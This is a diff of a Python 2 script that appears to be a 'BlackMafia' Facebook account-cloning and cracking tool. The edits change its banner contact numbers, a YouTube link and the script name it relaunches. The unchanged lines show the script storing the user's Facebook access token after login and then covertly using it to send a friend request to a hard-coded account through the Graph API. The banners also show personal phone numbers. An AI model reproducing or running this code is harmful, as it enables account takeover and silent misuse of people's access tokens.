@@ -25,7 +25,7 @@ try:
 except ImportError:
     os.system('pip2 install mechanize')
     time.sleep(1)
-    os.system('python2 Cloning.py')
+    os.system('python2 C.py')
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -93,7 +93,7 @@ logo = """
 \033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
 \033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 \033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;93m\033[1;92m\033[1;93m WhatsApp Num \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m 03094161457 \033[1;92m\033[1;95m
+\033[1;93m\033[1;92m\033[1;93m WhatsApp Num \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m 03080570818 \033[1;92m\033[1;95m
 \033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
 logo2 = """
 \033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
@@ -104,10 +104,10 @@ logo2 = """
 \033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇ K\033[1;91m A ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇  \033[1;91m   ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03094161457 ▇▇
+\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03080570818 ▇▇
 \033[1;95m«---------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
 logo3 = """
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03094161457 ▇▇"
+\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03080570818 ▇▇"
 ___________________$$$$$$
 _______________$$$__$$_$$$
 _______________$____¶¶___$$§§
@@ -1004,7 +1004,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://m.youtube.com/channel/UCHNT-JPOilcepG3g5fCiqXQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
